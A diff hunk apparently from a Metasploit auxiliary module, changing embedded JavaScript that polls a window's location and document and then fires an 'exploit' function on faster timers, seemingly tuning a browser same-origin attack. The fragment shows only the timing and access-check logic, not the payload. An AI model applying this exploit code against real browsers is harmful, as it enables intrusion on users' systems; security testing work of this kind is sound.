@@ -127,12 +127,12 @@ class Metasploit3 < Msf::Auxiliary
             }, 50);
             var clear2 = setInterval(function(){
               try {
+                if (w.location.toString()) return;
                 if (w.document) return;
-                if (w.location.href.toString()) return;
               } catch(e) {}
               clearInterval(clear2);
-              clear2 = setInterval(exploit, 300);
-            },100);
+              clear2 = setInterval(exploit, 50);
+            },20);
           } else {
             exploit();
           }
